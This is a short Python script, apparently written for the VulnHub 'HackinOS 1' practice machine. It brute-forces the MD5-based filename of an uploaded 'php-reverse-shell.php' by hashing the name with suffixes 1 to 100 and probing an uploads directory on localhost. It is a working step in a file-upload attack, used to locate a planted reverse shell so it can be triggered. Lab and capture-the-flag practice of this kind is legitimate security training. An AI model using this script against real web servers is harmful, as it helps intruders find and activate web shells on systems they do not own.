# Rıdvan KAPLAN
# The script to find url for uploaded file
# The machine link :  https://www.vulnhub.com/entry/hackinos-1,295/
# The upload page link : https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php


#!/usr/bin/python3

import hashlib
import requests

print("******* Find The File !!! ************")

filename = "php-reverse-shell.php"

def request(url):
    response = requests.head(url)
    if response.status_code == 200:
        print ("Found!")
        print (url)


def md5Enc(file):
	md5 = hashlib.md5(file.encode())
	md5 = md5.hexdigest()
	dir = "uploads/" + md5 + ".php"
	#print(dir)
	request("http://localhost:8000/" + dir)

def loop():
	for i in range(1,101):
		md5Enc(filename + str(i))

def main():
	loop()

main()
